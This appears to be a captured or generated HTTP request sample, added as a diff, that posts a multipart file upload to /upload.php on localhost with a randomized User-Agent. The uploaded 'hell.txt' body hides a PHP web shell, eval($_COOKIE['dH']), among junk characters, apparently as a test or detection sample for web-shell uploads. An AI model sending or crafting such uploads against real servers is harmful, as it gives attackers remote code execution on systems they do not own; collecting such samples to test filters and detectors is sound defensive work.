@@ -1,0 +1,14 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: zh
+User-Agent: NOKIA5700/424.8 (Linux 6.8; Linux 8.4; 360SE 2.2)  Presto/5.4.9 Version/2 3.2
+Content-Type: multipart/form-data; boundary=----tEYmnqVAKpSbPAVjqFcdrcKhEz
+Content-Length: 254
+Connection: close
+
+------tEYmnqVAKpSbPAVjqFcdrcKhEz
+Content-Disposition: form-data; name="username"; filename="hell.txt"
+
+dwedweIVbcqnXFTfhRS<?php  eval($_COOKIE['dH'])?><? A3411(,rQ)#\u00a5%463Fi\u2026\u2026&*\uff088R
+------tEYmnqVAKpSbPAVjqFcdrcKhEz--
